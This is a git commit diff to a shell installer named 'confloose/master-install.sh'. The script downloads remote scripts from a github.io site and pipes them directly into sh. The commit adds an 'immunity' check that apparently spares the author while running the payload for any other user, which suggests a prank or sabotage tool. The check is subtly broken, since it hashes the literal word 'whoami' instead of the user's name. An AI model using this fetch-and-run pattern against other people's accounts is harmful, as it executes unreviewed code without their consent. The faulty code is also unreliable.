840129853abaaf760eb41a341730b95d6cb4073e
d-002 <minecraftenjoy@outlook.fr>
2026-02-08 13:05:18 +0100

    confloose master install owner protection

--- confloose/master-install.sh
+++ confloose/master-install.sh
@@ -1,1 +1,11 @@
-install() { for arg in "$@"; do curl "https://d-002.github.io/epita/confloose/$arg/confloose.sh" | sh; done }; install
+install() {
+    for arg in "$@"; do
+        curl "https://d-002.github.io/epita/confloose/$arg/confloose.sh" | sh;
+    done
+}
+hash=$(echo whoami | md5sum | tr -dc 'a-f0-9')
+if [ "$hash" != "a8422b0d1789c5025c3fe7f8c8e959b2" ]; then
+    install
+else
+    echo "Sorry, but this user is immune."
+fi
